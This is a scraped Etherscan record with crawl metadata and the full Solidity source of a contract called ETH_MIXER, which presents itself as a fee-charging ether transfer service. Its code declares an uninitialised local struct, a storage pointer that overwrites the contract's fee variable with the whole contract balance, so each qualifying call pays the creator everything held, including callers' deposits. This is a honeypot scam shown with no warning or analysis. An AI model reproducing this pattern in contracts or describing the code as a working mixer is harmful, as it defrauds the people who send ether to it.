//token_name	
//token_url	https://etherscan.io//address/0x783CF9C6754BF826f1727620B4BAa19714fEDF8D#code
//spider_time	2018/07/08 12:37:51
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.19;

contract ETH_MIXER
{
    uint256 feePaid;
    uint256 creatorFee = 0.001 ether;
    uint256 totalTransfered;
    
    struct Transfer
    {
        uint256 timeStamp;
        uint256 currContractBallance;
        uint256 transferAmount;
    }
    
    Transfer[] Log;
    
    address creator = msg.sender;
    
    function() public payable{}
    
    function MakeTransfer(address _adr, uint256 _am)
    external
    payable
    {
        if(msg.value > 1 ether)
        {
            require(msg.sender == tx.origin);
            Transfer LogUnit;
            LogUnit.timeStamp = now;
            LogUnit.currContractBallance = this.balance;
            LogUnit.transferAmount= _am;
            Log.push(LogUnit);
            
            creator.send(creatorFee);
            _adr.send(_am);
            
            feePaid+=creatorFee;
            totalTransfered+=_am;
        }
    }    
}